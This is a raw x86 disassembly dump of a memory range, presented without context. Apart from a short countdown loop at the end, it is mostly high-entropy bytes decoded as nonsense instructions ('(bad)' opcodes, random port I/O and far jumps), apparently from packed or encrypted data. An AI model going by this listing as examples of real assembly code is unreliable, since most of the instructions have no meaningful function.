  41371e:	sub    al,0x4c
  413720:	or     al,0x10
  413722:	push   cs
  413723:	mov    ds:0xb4493151,al
  413728:	into   
  413729:	inc    eax
  41372a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41372b:	shr    BYTE PTR [edx],0x99
  41372e:	xchg   esp,esp
  413730:	out    dx,al
  413731:	adc    DWORD PTR [edi],esi
  413733:	(bad)  
  413734:	jp     0x413712
  413736:	mov    es,WORD PTR [edx-0x67]
  413739:	aad    0xf7
  41373b:	jmp    0x4136c6
  41373d:	(bad)  
  41373e:	dec    esp
  41373f:	je     0x4136e0
  413741:	cmp    DWORD PTR [edi],edx
  413743:	fdiv   st,st(3)
  413745:	fldcw  WORD PTR [eax+0x4c]
  413748:	test   BYTE PTR [edx],bl
  41374a:	ret    
  41374b:	sti    
  41374c:	scas   eax,DWORD PTR es:[edi]
  41374d:	xchg   esi,eax
  41374e:	pushf  
  41374f:	in     al,dx
  413750:	pushf  
  413751:	jecxz  0x41374c
  413753:	pop    edi
  413754:	popf   
  413755:	in     eax,0xfb
  413757:	xchg   esi,eax
  413758:	in     eax,dx
  413759:	ret    
  41375a:	and    ah,BYTE PTR [esi+0x65]
  41375d:	dec    ebp
  41375e:	popa   
  41375f:	repnz mov bl,0x4e
  413762:	xor    eax,0xd4aa7246
  413767:	mov    cl,0x4e
  413769:	fidiv  DWORD PTR [edi]
  41376b:	mov    cl,0x49
  41376d:	fisubr WORD PTR [edi]
  41376f:	mov    ecx,0x5cf1dd0f
  413774:	sar    BYTE PTR [eax+edi*8],cl
  413777:	xchg   edi,eax
  413778:	ss cmp al,0xe7
  41377b:	mov    cl,0xc8
  41377d:	mov    bh,0x63
  41377f:	sub    al,0xe1
  413781:	dec    ebx
  413782:	xor    al,0x6f
  413784:	add    edx,DWORD PTR [esi+eiz*4-0x5c394e61]
  41378b:	sub    ch,BYTE PTR [esi+0x37]
  41378e:	arpl   WORD PTR [edi],bx
  413790:	cli    
  413791:	out    dx,al
  413792:	push   0x64
  413794:	push   edx
  413795:	fidivr DWORD PTR [esi+0x68c62e9e]
  41379b:	mov    WORD PTR ds:0x79122ce9,gs
  4137a1:	pop    ds
  4137a2:	(bad)  
  4137a3:	dec    esp
  4137a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137a5:	or     BYTE PTR [esi],cl
  4137a7:	icebp  
  4137a8:	jg     0x413792
  4137aa:	jo     0x413823
  4137ac:	loop   0x41375f
  4137ae:	(bad)  
  4137af:	jmp    0x413785
  4137b1:	jno    0x4137c6
  4137b3:	sbb    BYTE PTR [esi-0x8],0x39
  4137b7:	inc    ebx
  4137b8:	mov    bh,0x14
  4137ba:	xchg   ebp,eax
  4137bb:	out    0x9d,al
  4137bd:	shr    BYTE PTR [esi],cl
  4137bf:	mov    dl,0x35
  4137c1:	xchg   esp,eax
  4137c2:	iret   
  4137c3:	(bad)  
  4137c4:	hlt    
  4137c5:	xlat   BYTE PTR ds:[ebx]
  4137c6:	and    BYTE PTR [edi],cl
  4137c8:	jnp    0x4137fe
  4137ca:	ror    edx,0x10
  4137cd:	fstp   DWORD PTR ds:0x1deb62b2
  4137d3:	repnz mov ds:0x1f77e7e7,eax
  4137d9:	aaa    
  4137da:	call   0x29d3:0x86ec5acb
  4137e1:	test   al,0xb4
  4137e3:	mov    eax,DWORD PTR [esi-0x1ef8ff18]
  4137e9:	in     eax,dx
  4137ea:	and    DWORD PTR [ebx+0x79],eax
  4137ed:	aaa    
  4137ee:	fcmovnu st,st(4)
  4137f0:	lods   al,BYTE PTR ds:[esi]
  4137f1:	push   0xf613bef1
  4137f6:	std    
  4137f7:	mov    BYTE PTR ds:0x2d95e53,ch
  4137fd:	sbb    BYTE PTR [edi-0x2f],ah
  413800:	lea    eax,[eax+0x1635de12]
  413806:	cmp    eax,0x7eab90b4
  41380b:	sti    
  41380c:	mov    edi,ebp
  41380e:	imul   BYTE PTR [eax+0x49]
  413811:	xchg   ebp,eax
  413812:	sub    ah,dl
  413814:	lahf   
  413815:	mov    ebx,0x98a62c92
  41381a:	clc    
  41381b:	cmp    eax,0x3747aa43
  413820:	jecxz  0x4137e6
  413822:	mov    edx,0x539c7775
  413827:	push   ds
  413828:	xchg   esi,eax
  413829:	cli    
  41382a:	inc    ebp
  41382b:	push   ebp
  41382c:	in     al,dx
  41382d:	pop    eax
  41382e:	push   edx
  41382f:	jecxz  0x413809
  413831:	js     0x4137d7
  413833:	jnp    0x413847
  413835:	cmc    
  413836:	or     dh,cl
  413838:	aas    
  413839:	ins    DWORD PTR es:[edi],dx
  41383a:	push   esp
  41383b:	pushw  ss
  41383d:	hlt    
  41383e:	xchg   ebx,eax
  41383f:	mov    ecx,0x52ee6baf
  413844:	(bad)  
  413845:	mov    edx,0xfc8b77f
  41384a:	mov    ecx,DWORD PTR [eax+0x6cde3d38]
  413850:	fld    QWORD PTR [edx+0x67]
  413853:	cmp    BYTE PTR [eax],dl
  413855:	jmp    0x413845
  413857:	iret   
  413858:	popa   
  413859:	push   es
  41385a:	arpl   dx,cx
  41385c:	lods   al,BYTE PTR ds:[esi]
  41385d:	jo     0x41388e
  41385f:	imul   edx,esi,0xffffffcc
  413862:	mov    ch,0xa4
  413864:	mov    edx,0xc2290398
  413869:	pop    esi
  41386a:	mov    bl,0x66
  41386c:	push   0xbc5d18a8
  413871:	dec    ebp
  413872:	(bad)  
  413873:	fnsave [ebx+0x30d86f96]
  413879:	pop    ebp
  41387a:	aas    
  41387b:	mov    ebx,cs
  41387d:	pop    ecx
  41387e:	(bad)  [edi-0x2c]
  413881:	pop    edx
  413882:	xor    ch,BYTE PTR [esi-0x3417f70]
  413888:	dec    ebx
  413889:	(bad)  
  41388a:	loopne 0x41385c
  41388c:	stos   BYTE PTR es:[edi],al
  41388d:	mov    eax,ds:0xa9e84423
  413892:	repnz and BYTE PTR fs:[esi],al
  413896:	xor    DWORD PTR [ebx+0x4a2bff74],esi
  41389c:	or     ebx,DWORD PTR [edx+0x5ccd8313]
  4138a2:	xor    DWORD PTR [edx-0x1567707a],ebp
  4138a8:	retf   0xc852
  4138ab:	int3   
  4138ac:	jne    0x4138e2
  4138ae:	aas    
  4138af:	jnp    0x4138a3
  4138b1:	dec    edi
  4138b2:	xchg   esp,eax
  4138b3:	lods   al,BYTE PTR ds:[esi]
  4138b4:	sahf   
  4138b5:	fs loope 0x4138b0
  4138b8:	mov    ds:0xfea8363a,al
  4138bd:	out    0x68,eax
  4138bf:	or     ecx,DWORD PTR [ecx]
  4138c1:	push   esp
  4138c2:	xchg   esi,eax
  4138c3:	inc    edx
  4138c4:	ins    BYTE PTR es:[edi],dx
  4138c5:	sbb    dh,BYTE PTR [edx]
  4138c7:	sub    al,0x73
  4138c9:	push   ds
  4138ca:	in     al,0xf9
  4138cc:	xchg   ebp,eax
  4138cd:	rol    DWORD PTR [bp-0x7d44],1
  4138d2:	fimul  DWORD PTR [ebx+0x66b10d36]
  4138d8:	shl    BYTE PTR [edi],1
  4138da:	rol    esi,1
  4138dc:	test   al,0x2a
  4138de:	lds    ecx,FWORD PTR [esi+0x60]
  4138e1:	push   0x8b7cdbda
  4138e6:	out    0xad,eax
  4138e8:	(bad)  [edx-0x4993ba]
  4138ee:	jmp    0x4138e1
  4138f0:	aaa    
  4138f1:	aam    0x6a
  4138f3:	sub    esp,DWORD PTR [eax+0x3ed60f6a]
  4138f9:	cdq    
  4138fa:	(bad)  
  4138fb:	fisttp DWORD PTR [ecx-0x7417e5a6]
  413901:	inc    ebp
  413902:	(bad)  
  413903:	jge    0x41392e
  413905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413906:	mov    ecx,0xed46d95
  41390b:	or     dl,BYTE PTR [ebx-0x79]
  41390e:	or     al,0x81
  413910:	jae    0x41396d
  413912:	jmp    0x1a37:0xa5d41055
  413919:	stos   DWORD PTR es:[edi],eax
  41391a:	jbe    0x4138b2
  41391c:	cs push 0x6f
  41391f:	xchg   DWORD PTR [edx],esp
  413921:	out    0x7d,eax
  413923:	cdq    
  413924:	mov    dh,0x6f
  413926:	mov    ds:0x66bfb6dc,eax
  41392b:	and    BYTE PTR [esi+ebp*2-0x72],bl
  41392f:	push   edx
  413930:	sbb    al,0xa1
  413932:	aad    0xbf
  413934:	inc    esp
  413935:	aas    
  413936:	sub    DWORD PTR [ebx+0x60fada41],esi
  41393c:	pop    esi
  41393d:	aas    
  41393e:	jno    0x4138c2
  413940:	inc    eax
  413941:	dec    edi
  413942:	mov    dl,BYTE PTR [eax-0x45dadaea]
  413948:	sub    ebp,DWORD PTR [edx]
  41394a:	ja     0x41392c
  41394c:	sub    al,0x54
  41394e:	fmul   st,st(1)
  413950:	mov    ecx,0xba44abe7
  413955:	test   ebx,ebp
  413957:	xchg   ebp,eax
  413958:	idiv   BYTE PTR [edi-0x27b40caf]
  41395e:	ss (bad) 
  413960:	pop    ecx
  413961:	fs mov ecx,0xdccdb1c4
  413967:	add    dh,ch
  413969:	fistp  WORD PTR [esi-0xdc39363]
  41396f:	pop    esp
  413970:	cwde   
  413971:	or     edi,ebx
  413973:	and    ebx,DWORD PTR [esi]
  413975:	push   cs
  413976:	cmp    DWORD PTR [edi-0x52],esp
  413979:	iret   
  41397a:	pop    ecx
  41397b:	jge    0x413914
  41397d:	mov    eax,ds:0xb807bb8f
  413982:	and    ah,BYTE PTR [esi-0x6c]
  413985:	sbb    al,0xec
  413987:	pop    eax
  413989:	fs jmp 0x5b49:0x6a4d1d07
  413991:	xor    ebp,ebx
  413993:	dec    edx
  413994:	inc    esi
  413995:	shl    BYTE PTR [edi-0x75d949b3],cl
  41399b:	mov    dh,0x79
  41399d:	dec    edx
  41399e:	jae    0x413973
  4139a0:	cmp    DWORD PTR [eax+0x7c],ebp
  4139a3:	mov    cl,0x6
  4139a5:	dec    ecx
  4139a6:	lods   al,BYTE PTR ds:[esi]
  4139a7:	push   ebp
  4139a8:	das    
  4139a9:	sbb    al,0xe
  4139ab:	jno    0x413a12
  4139ad:	jmp    0x18abf986
  4139b2:	push   ecx
  4139b3:	jo     0x413a04
  4139b5:	enter  0xad1a,0x61
  4139b9:	fcomp  QWORD PTR [esi+0x6b]
  4139bc:	xchg   BYTE PTR [esp+eax*8],ah
  4139bf:	xchg   ebx,eax
  4139c0:	mov    cl,0x85
  4139c2:	iret   
  4139c3:	bound  eax,QWORD PTR [esi-0x6e]
  4139c6:	pusha  
  4139c7:	pusha  
  4139c8:	mov    esi,0xe24f38c1
  4139cd:	lock push cs
  4139cf:	jmp    0xc1d:0xf559fe54
  4139d6:	cmp    eax,0x93e4fb33
  4139db:	xchg   edi,eax
  4139dc:	imul   eax,DWORD PTR [ebx+0x7d],0xffffffd5
  4139e0:	pushf  
  4139e1:	or     DWORD PTR [ecx+0x2d],0x4f
  4139e5:	push   edi
  4139e6:	ss inc edx
  4139e8:	or     esi,DWORD PTR [ebx+0x78]
  4139eb:	enter  0xd75a,0x2d
  4139ef:	jge    0x413993
  4139f1:	jbe    0x413a20
  4139f3:	inc    esi
  4139f4:	mov    cl,bl
  4139f6:	jbe    0x413a3d
  4139f8:	dec    edi
  4139f9:	cwde   
  4139fa:	das    
  4139fb:	pusha  
  4139fc:	sbb    BYTE PTR [ebx+0x6f],0x65
  413a00:	mov    cl,0x1
  413a02:	popf   
  413a03:	inc    edx
  413a04:	mov    cl,bh
  413a06:	cld    
  413a07:	adc    al,0xa0
  413a09:	retf   
  413a0a:	xchg   edi,esp
  413a0c:	and    dh,BYTE PTR [edx]
  413a0e:	sub    ecx,DWORD PTR [ebp-0x2c]
  413a11:	inc    edi
  413a12:	dec    edx
  413a13:	or     ch,BYTE PTR [edi]
  413a15:	enter  0x76d0,0x6e
  413a19:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a1c:	jle    0x413a49
  413a1e:	sbb    eax,0x415efb61
  413a23:	mov    edx,0x13783647
  413a28:	xlat   BYTE PTR ds:[ebx]
  413a29:	and    al,0xd2
  413a2b:	add    BYTE PTR [ebx],dl
  413a2d:	lods   al,BYTE PTR ds:[esi]
  413a2e:	mov    DWORD PTR [ebx+0x54],ebp
  413a31:	mov    bl,al
  413a33:	inc    ebp
  413a34:	fcom   QWORD PTR [edx]
  413a36:	jb     0x413a17
  413a38:	stos   BYTE PTR es:[edi],al
  413a39:	adc    al,0x35
  413a3b:	push   ss
  413a3c:	ror    DWORD PTR [ecx-0x2b9c7cd6],1
  413a42:	mov    ds:0x4e5efa8f,eax
  413a47:	sub    al,bh
  413a49:	imul   DWORD PTR [ebp-0x12f55850]
  413a4f:	inc    edi
  413a50:	mov    dl,0x88
  413a52:	(bad)  
  413a53:	push   esi
  413a54:	outs   dx,BYTE PTR ds:[esi]
  413a55:	mov    eax,0x511922cc
  413a5a:	or     cl,BYTE PTR ds:0xc5c5655f
  413a60:	call   0x5859:0xaab01dfa
  413a67:	add    DWORD PTR [ebp+0x4ba0c6ed],ecx
  413a6d:	stc    
  413a6e:	xchg   esp,eax
  413a6f:	test   BYTE PTR cs:[ebx+0x13],bl
  413a73:	repnz cld 
  413a75:	xchg   ebx,eax
  413a76:	push   ebx
  413a77:	or     edi,edi
  413a79:	mov    WORD PTR [ebx-0x37],?
  413a7c:	daa    
  413a7d:	aas    
  413a7e:	test   al,0x6b
  413a80:	jecxz  0x413a79
  413a82:	shl    DWORD PTR [eax],0x7b
  413a85:	fld    DWORD PTR [ebp+0x667ade57]
  413a8b:	fsubr  st,st(3)
  413a8d:	imul   BYTE PTR [edx]
  413a8f:	out    0xca,eax
  413a91:	mov    al,ds:0xe6851dd2
  413a96:	sbb    DWORD PTR [esi+esi*1+0x47],ebp
  413a9a:	je     0x413af1
  413a9c:	imul   edi,DWORD PTR [esi+0x50],0xffffffe1
  413aa0:	push   esp
  413aa1:	test   edi,edi
  413aa3:	outs   dx,BYTE PTR ds:[esi]
  413aa4:	xor    cl,BYTE PTR [edi-0x4fa59dc2]
  413aaa:	std    
  413aab:	xlat   BYTE PTR es:[ebx]
  413aad:	sub    al,0x9c
  413aaf:	pushf  
  413ab0:	and    DWORD PTR [edx],0x50
  413ab3:	(bad)  
  413ab4:	out    dx,eax
  413ab5:	mov    esp,0x434bad16
  413aba:	in     eax,dx
  413abb:	cld    
  413abc:	outs   dx,BYTE PTR ds:[esi]
  413abd:	sti    
  413abe:	cld    
  413abf:	data16 aas 
  413ac1:	aas    
  413ac2:	or     al,0xcc
  413ac4:	xor    ah,cl
  413ac6:	jns    0x413b17
  413ac8:	repz and DWORD PTR [ebx-0x5f],edi
  413acc:	push   ss
  413acd:	gs cmc 
  413acf:	xor    eax,0xc12abfc7
  413ad4:	inc    ebp
  413ad5:	hlt    
  413ad6:	js     0x413b27
  413ad8:	inc    edx
  413ad9:	cmp    eax,0x2d889b2e
  413ade:	mov    eax,0x2a76d1c4
  413ae3:	mov    ah,0xa4
  413ae5:	ss pop edi
  413ae7:	or     ah,BYTE PTR [eax+0x4a]
  413aea:	hlt    
  413aeb:	ja     0xb5cd55be
  413af1:	je     0x413b02
  413af3:	mov    bh,0x98
  413af5:	inc    edi
  413af6:	add    ch,bh
  413af8:	rcr    eax,0xa3
  413afb:	hlt    
  413afc:	popa   
  413afd:	push   ss
  413afe:	call   0x5982b81e
  413b03:	jae    0x413b04
  413b05:	xchg   edi,eax
  413b06:	inc    edi
  413b07:	fidiv  WORD PTR [ebx+edx*4-0x10f4c2ac]
  413b0e:	es sbb eax,0x6bb41c56
  413b14:	psubq  mm5,QWORD PTR [ecx-0x3c]
  413b18:	jl     0x413b20
  413b1a:	test   BYTE PTR [esi],dh
  413b1c:	mov    eax,ecx
  413b1e:	sub    DWORD PTR [ecx-0x13e1d432],edi
  413b24:	dec    edi
  413b25:	inc    esp
  413b26:	xor    al,0x1a
  413b28:	mov    BYTE PTR [esp+ebx*4],ch
  413b2b:	xor    al,0xcd
  413b2d:	aas    
  413b2e:	ja     0x413afb
  413b30:	push   eax
  413b31:	scas   al,BYTE PTR es:[edi]
  413b32:	js     0x413b8d
  413b34:	push   eax
  413b35:	ins    DWORD PTR es:[edi],dx
  413b36:	dec    ebp
  413b37:	jmp    0x4944:0xd6bc6e22
  413b3e:	mov    cl,0x68
  413b40:	mov    eax,ds:0x35ece706
  413b45:	push   cs
  413b46:	fld    TBYTE PTR [ecx+0x6f]
  413b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b4a:	push   eax
  413b4b:	jo     0x413b6e
  413b4d:	jo     0x413b3a
  413b4f:	pop    ecx
  413b50:	ret    0xd535
  413b53:	cwde   
  413b54:	mov    ecx,DWORD PTR [ecx+eax*1+0x4f3043fb]
  413b5b:	aas    
  413b5c:	lahf   
  413b5d:	pushf  
  413b5e:	xor    al,0x74
  413b60:	mov    cl,0x26
  413b62:	out    0x82,eax
  413b64:	ins    DWORD PTR es:[edi],dx
  413b65:	aad    0x15
  413b67:	leave  
  413b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b69:	jge    0x413b21
  413b6b:	xchg   esp,eax
  413b6c:	xor    BYTE PTR [esi+0x13],bl
  413b6f:	mov    ebx,0x5ecf9a07
  413b74:	cdq    
  413b75:	imul   BYTE PTR [ebp+edi*8-0x41]
  413b79:	pop    ds
  413b7a:	ss jg  0x413bdc
  413b7d:	out    0x11,al
  413b7f:	sbb    al,BYTE PTR [eax+0x68]
  413b82:	es jmp 0xd5f9:0x9b6e4398
  413b8a:	xchg   ebp,eax
  413b8b:	daa    
  413b8c:	ret    0x51a0
  413b8f:	push   ds
  413b90:	sbb    al,0x90
  413b92:	sub    ch,dh
  413b94:	data16 sbb BYTE PTR [ebp+0x18],ah
  413b98:	stc    
  413b99:	lods   al,BYTE PTR ds:[esi]
  413b9a:	test   BYTE PTR [edi-0x42],al
  413b9d:	xor    DWORD PTR [esi],0xffffffa8
  413ba0:	out    0x4c,al
  413ba2:	scas   al,BYTE PTR es:[edi]
  413ba3:	sar    DWORD PTR [ebx-0x73],1
  413ba6:	ror    BYTE PTR [edx],cl
  413ba8:	aas    
  413ba9:	aaa    
  413baa:	cmp    ah,cl
  413bac:	cli    
  413bad:	xor    DWORD PTR [edi-0x26c53899],ebp
  413bb3:	rol    DWORD PTR [eax+0xf2e406],0x67
  413bba:	nop
  413bbb:	mov    ss,esi
  413bbd:	dec    eax
  413bbe:	imul   BYTE PTR [edx+0xe1e5cc2]
  413bc4:	cmp    al,0x45
  413bc6:	in     eax,0x8e
  413bc8:	mov    esi,0xda0d69e9
  413bcd:	mov    al,0x60
  413bcf:	ret    0x5c8b
  413bd2:	mov    bh,0x40
  413bd4:	xor    ch,BYTE PTR [edx+0x1f]
  413bd7:	sbb    bh,BYTE PTR [edx+edx*8]
  413bda:	call   0xb7e4be75
  413bdf:	test   BYTE PTR [edi],cl
  413be1:	mov    al,0x2
  413be3:	push   ss
  413be4:	dec    ebp
  413be5:	out    0xf2,eax
  413be7:	ret    
  413be8:	pop    es
  413be9:	jns    0x413b6b
  413beb:	in     eax,0x5f
  413bed:	sbb    BYTE PTR [edi+0x3b],cl
  413bf0:	loopne 0x413ba3
  413bf2:	mov    ecx,0x6ab3bd43
  413bf7:	lgdtd  [ecx+0x5e]
  413bfb:	gs cdq 
  413bfd:	add    eax,0xcc27a4a6
  413c02:	mov    bh,0x29
  413c04:	add    bl,BYTE PTR [edi+0x73e66b54]
  413c0a:	test   BYTE PTR [eax-0x7109d239],ah
  413c10:	xchg   ebx,eax
  413c11:	cmp    DWORD PTR [edi-0x25],edx
  413c14:	sbb    BYTE PTR [ecx-0x785ecd0e],ah
  413c1a:	in     al,0x7e
  413c1c:	rcl    BYTE PTR [esp+edi*1-0x55762477],0x8
  413c24:	ds inc edx
  413c26:	sbb    al,0x8b
  413c28:	and    BYTE PTR [ecx+eax*4],ch
  413c2b:	jno    0x413c02
  413c2d:	jmp    0x21629670
  413c32:	xor    DWORD PTR [ecx-0x22dd8959],0x8de69047
  413c3c:	add    al,0x92
  413c3e:	je     0x413c81
  413c40:	fs inc esi
  413c42:	pop    edx
  413c43:	neg    BYTE PTR [ecx+0x4b]
  413c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c47:	mov    bh,0x2e
  413c49:	mov    edi,0x3a3dbb66
  413c4e:	(bad)  
  413c4f:	cmp    ch,bl
  413c51:	push   0xda49938a
  413c56:	mov    esp,0xb8a44b74
  413c5b:	mul    DWORD PTR [eax+0x4d]
  413c5e:	sub    eax,DWORD PTR [edx+0x2a]
  413c61:	test   bh,bh
  413c63:	adc    al,0x83
  413c65:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413c67:	loope  0x413c29
  413c69:	xor    DWORD PTR [edx+0x5e],esp
  413c6c:	sub    eax,0x3504c282
  413c71:	add    ecx,DWORD PTR [edx+0x6c]
  413c74:	scas   eax,DWORD PTR es:[edi]
  413c75:	js     0x413cf5
  413c77:	loop   0x413c10
  413c79:	stc    
  413c7a:	pop    ss
  413c7b:	cwde   
  413c7c:	add    cl,0x8d
  413c7f:	adc    BYTE PTR [ecx+0x2899ef2],dl
  413c85:	stos   DWORD PTR es:[edi],eax
  413c86:	pop    edx
  413c87:	cli    
  413c88:	ror    BYTE PTR [ecx-0x66],1
  413c8b:	ds sub bl,al
  413c8e:	sub    eax,0xaf0603c4
  413c93:	ja     0x413c82
  413c95:	jae    0x413c83
  413c97:	in     al,dx
  413c98:	jl     0x413c6f
  413c9a:	jbe    0x413cee
  413c9c:	pop    eax
  413c9d:	sbb    DWORD PTR [edx-0x7bb7cf0f],eax
  413ca3:	fisub  DWORD PTR [eax+eiz*8+0x476ad4e]
  413caa:	sub    ch,BYTE PTR [edx]
  413cac:	stos   DWORD PTR es:[edi],eax
  413cad:	fwait
  413cae:	add    eax,ebx
  413cb0:	js     0x413d1b
  413cb2:	addr16 xchg edi,eax
  413cb4:	cwde   
  413cb5:	mov    ebp,eax
  413cb7:	mov    bl,0x4
  413cb9:	popa   
  413cba:	sar    BYTE PTR [edi+0x3fad2c0a],1
  413cc0:	aaa    
  413cc1:	ss inc ebp
  413cc3:	shl    edx,cl
  413cc5:	mov    WORD PTR [eax+0x22a9cf5b],cs
  413ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ccc:	pop    ebx
  413ccd:	clc    
  413cce:	mov    DWORD PTR [ecx-0x5c],edi
  413cd1:	push   ds
  413cd2:	outs   dx,BYTE PTR ds:[esi]
  413cd3:	inc    ecx
  413cd4:	enter  0x6cee,0x79
  413cd8:	jo     0x413cb5
  413cda:	test   DWORD PTR [ecx],esi
  413cdc:	fsubr  DWORD PTR [esi+0x4bc1833b]
  413ce2:	sbb    BYTE PTR [ebp+0x42bd5ee2],dh
  413ce8:	or     dh,BYTE PTR [ebp+0x6a]
  413ceb:	sbb    DWORD PTR [ebx],eax
  413ced:	shr    BYTE PTR [ecx+0x1a2603e3],cl
  413cf3:	hlt    
  413cf4:	and    al,BYTE PTR [ebp-0x14f59b5b]
  413cfa:	pop    ebp
  413cfb:	sub    bh,dh
  413cfd:	add    BYTE PTR [eax+0x5],bl
  413d00:	jns    0x413cfb
  413d02:	ret    
  413d03:	enter  0x9547,0x14
  413d07:	inc    esp
  413d08:	sub    al,0x6e
  413d0a:	outs   dx,DWORD PTR ds:[esi]
  413d0b:	daa    
  413d0c:	shl    DWORD PTR [ebp+0x1dc1c780],cl
  413d12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d13:	and    DWORD PTR [ebx],edx
  413d15:	sbb    DWORD PTR [eax-0xc],ebp
  413d18:	shl    DWORD PTR [eax+0x11],1
  413d1b:	cmp    ah,dh
  413d1d:	loop   0x413ced
  413d1f:	cmp    ah,dl
  413d21:	inc    eax
  413d22:	not    DWORD PTR [edx+0x4740d98f]
  413d28:	pop    es
  413d29:	adc    cl,bh
  413d2b:	inc    eax
  413d2c:	shl    DWORD PTR [eax-0x7b],cl
  413d2f:	xchg   ebp,eax
  413d30:	xchg   edx,eax
  413d31:	rcr    DWORD PTR [ecx],1
  413d33:	xchg   esi,eax
  413d34:	cmp    DWORD PTR [ecx+0x3481d244],eax
  413d3a:	mov    eax,DWORD PTR [edx]
  413d3c:	in     al,0xd5
  413d3e:	mov    eax,0x532cc51a
  413d43:	mov    dl,dl
  413d45:	loope  0x413d80
  413d47:	jp     0x413d3c
  413d49:	clc    
  413d4a:	in     al,0xef
  413d4c:	fdiv   QWORD PTR [ebx]
  413d4e:	mov    bl,0xd5
  413d50:	cmp    eax,0x4044a0fb
  413d55:	jp     0x413db4
  413d57:	leave  
  413d58:	hlt    
  413d59:	adc    cl,BYTE PTR [esp+edx*2]
  413d5c:	shl    edi,cl
  413d5e:	sbb    al,0x9c
  413d60:	or     BYTE PTR [ecx-0x33],al
  413d63:	pop    ds
  413d64:	sbb    ebp,ecx
  413d66:	push   0x3d
  413d68:	add    BYTE PTR [eax-0x4de22c6e],ch
  413d6e:	xchg   BYTE PTR [eax+0x26],al
  413d71:	aas    
  413d72:	pop    eax
  413d73:	cdq    
  413d74:	je     0x413d44
  413d76:	xchg   BYTE PTR [edi-0x49],dl
  413d79:	or     al,BYTE PTR fs:[esi]
  413d7c:	int    0x80
  413d7e:	daa    
  413d7f:	xchg   ebx,eax
  413d80:	push   esp
  413d81:	pusha  
  413d82:	add    DWORD PTR ds:0x517c7f83,ebx
  413d88:	sbb    eax,ecx
  413d8a:	ins    DWORD PTR es:[edi],dx
  413d8b:	call   0x355:0xb18560b1
  413d92:	bnd jmp 0x334207de
  413d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d99:	sahf   
  413d9a:	or     edx,0x18c20562
  413da0:	lock and edx,DWORD PTR ss:0x320d5059
  413da8:	nop
  413da9:	xor    al,0xea
  413dab:	ror    BYTE PTR [edi-0x581b14bf],1
  413db1:	ror    BYTE PTR [ebx-0x56],0xf1
  413db5:	pop    ss
  413db6:	xchg   edx,eax
  413db7:	lock and eax,DWORD PTR [ebx]
  413dba:	ss xor bh,ah
  413dbd:	sub    eax,0xde588182
  413dc2:	mov    ebp,0xcda0965d
  413dc7:	add    edi,ecx
  413dc9:	push   ds
  413dca:	out    0x69,eax
  413dcc:	push   ss
  413dcd:	in     al,0x77
  413dcf:	call   0xdd247612
  413dd4:	mov    DWORD PTR [edi],0x557ea6ba
  413dda:	mov    ah,0xa5
  413ddc:	ror    BYTE PTR [edx+0x283e9c45],0x5e
  413de3:	ret    
  413de4:	dec    esi
  413de5:	mov    dl,ah
  413de7:	mov    al,ds:0x68922e59
  413dec:	sar    ah,1
  413dee:	and    al,0x27
  413df0:	cmp    al,bl
  413df2:	jl     0x413e24
  413df4:	pop    edx
  413df5:	ror    BYTE PTR [ebp+0x2f32184],1
  413dfb:	addr16 sahf 
  413dfd:	mov    ebx,ebp
  413dff:	idiv   BYTE PTR [ecx-0x48]
  413e02:	dec    eax
  413e03:	sbb    eax,0xcc156a5f
  413e08:	popf   
  413e09:	xor    edx,0x25
  413e0c:	sbb    edx,ebx
  413e0e:	lock mov edi,DWORD PTR [ecx-0x1d]
  413e12:	lods   ax,WORD PTR ds:[esi]
  413e14:	inc    ebx
  413e15:	mov    dh,0xa3
  413e17:	cli    
  413e18:	jle    0x413dff
  413e1a:	loopne 0x413e19
  413e1c:	sub    eax,0xbd4bb688
  413e21:	aad    0x50
  413e23:	imul   ecx,ecx,0x79955d90
  413e29:	xor    BYTE PTR [ebx+0x743d2c6e],al
  413e2f:	jno    0x413ea9
  413e31:	cmp    eax,0x8e396dbc
  413e36:	xlat   BYTE PTR ds:[ebx]
  413e37:	push   0xf184db5c
  413e3c:	mov    dh,0xd6
  413e3e:	leave  
  413e3f:	mov    ebx,0xdab3f906
  413e44:	jne    0x413ddb
  413e46:	out    dx,eax
  413e47:	(bad)  
  413e48:	dec    ecx
  413e49:	fsub   st(1),st
  413e4b:	inc    ebx
  413e4c:	(bad)  
  413e4d:	frstor [esi-0x240262c9]
  413e53:	add    al,0xc7
  413e55:	sub    eax,0x2223ef6b
  413e5a:	test   al,0xb4
  413e5c:	enter  0xd14e,0x3f
  413e60:	cmp    DWORD PTR [ebp-0x143003f2],0x7a7cd46e
  413e6a:	or     edx,DWORD PTR [esi+0x5cfe779f]
  413e70:	hlt    
  413e71:	pop    es
  413e72:	retf   
  413e73:	sbb    al,0xb9
  413e75:	xchg   BYTE PTR [edx+ebx*8],al
  413e78:	fdivr  QWORD PTR [edx+0x33]
  413e7b:	fadd   DWORD PTR [ecx+0x4290280d]
  413e81:	add    BYTE PTR [esi+ecx*1-0x2cd50000],ah
  413e88:	sub    edx,esi
  413e8a:	adc    ebx,0x6a6a
  413e90:	xor    edx,eax
  413e92:	mov    DWORD PTR ds:0x42a008,0x12
  413e9c:	cmp    DWORD PTR ds:0x42a008,0x0
  413ea3:	je     0x413eed
  413ea9:	cmp    DWORD PTR ds:0x42a008,0x7
  413eb0:	jne    0x413ec1
  413eb6:	push   0x45cf
  413ebb:	call   DWORD PTR ds:0x42ed5b
  413ec1:	cmp    DWORD PTR ds:0x42a008,0x8
  413ec8:	jne    0x413edb
  413ece:	mov    ebx,DWORD PTR ds:0x42a008
  413ed4:	dec    ebx
  413ed5:	mov    DWORD PTR ds:0x42a008,ebx
  413edb:	mov    ebx,DWORD PTR ds:0x42a008
  413ee1:	dec    ebx
  413ee2:	mov    DWORD PTR ds:0x42a008,ebx
  413ee8:	jmp    0x413e9c
  413eed:	mov    DWORD PTR [ebp+0x8],edx
  413ef0:	and    DWORD PTR ds:0x42c01c,edx
  413ef6:	mov    edx,DWORD PTR [ebp+0x8]
